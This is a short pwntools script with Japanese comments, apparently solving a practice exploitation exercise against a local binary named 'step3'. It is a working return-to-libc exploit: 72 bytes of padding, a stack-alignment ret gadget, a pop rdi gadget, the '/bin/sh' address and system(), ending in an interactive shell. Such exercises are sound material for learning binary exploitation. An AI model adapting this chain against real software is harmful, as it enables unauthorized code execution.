from pwn import *
process = process('./step3')

pop_rdi_ret_addr = 0x4005e3
bin_sh_addr = 0x7ffff7b95d88
system_addr = 0x7ffff7a31420
ret_addr = 0x400416

# p64はアドレスをバイトに変換
payload = b"A" * 72 # この次に入る値が(ret(pop rip)で)実行させたいアドレス(RIP))
payload += p64(ret_addr) # stack alignment
payload += p64(pop_rdi_ret_addr) # RIPはpop rdi; retを実行するアドレス
payload += p64(bin_sh_addr) # rdiにはrspの値が入るから、/bin/shのアドレスをコピー
payload += p64(system_addr) # retでrspの値を読むからsystem関数に飛ぶ。rdiには/bin/shがあるからsystem(/bin/sh)となる。

process.sendlineafter(b"Input data: ", payload)
process.interactive()